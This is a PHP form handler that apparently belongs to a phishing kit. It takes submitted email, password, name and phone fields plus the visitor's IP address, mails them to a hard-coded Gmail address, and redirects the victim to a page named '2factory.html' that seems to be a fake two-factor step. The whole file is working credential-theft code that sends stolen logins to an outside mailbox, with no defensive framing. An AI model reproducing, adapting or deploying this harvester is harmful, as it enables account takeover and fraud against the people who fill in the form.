<?php

session_start();
if(isset($_SESSION['u'])){
  if($_SESSION['u'] === '123') {
  }else {
  }
}

$imellaa = $_POST['imellaa'];

$passporti = $_POST['passporti'];

$faqeemer = $_POST['faqeemer'];

$nrtelef = $_POST['nrtelef'];



$ip = $_SERVER['REMOTE_ADDR'];



$stringi = 'imellaa: '.$imellaa . PHP_EOL .'passporti: '. $passporti.PHP_EOL .'nrtelef:'. $nrtelef.PHP_EOL .'faqeemer: '.$faqeemer . PHP_EOL .'IP: '. $ip;
mail("raloqka2021@gmail.com","Info", $stringi);
header("Location: 2factory.html");

?>